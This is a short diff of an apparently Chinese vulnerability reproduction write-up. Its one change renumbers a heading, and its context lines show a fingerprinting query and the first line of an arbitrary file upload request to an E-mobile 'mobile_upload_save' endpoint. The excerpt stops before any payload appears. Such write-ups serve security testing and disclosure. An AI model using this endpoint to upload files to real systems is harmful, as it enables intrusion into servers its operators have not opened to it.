@@ -4,7 +4,7 @@
 body="/newplugins/js/pnotify/jquery.pnotify.default.css"
 ```
 <a name="TNcUl"></a>
-# 三、漏洞复现
+# 二、漏洞复现
 请求接口上传任意文件
 ```java
 POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save  HTTP/1.1
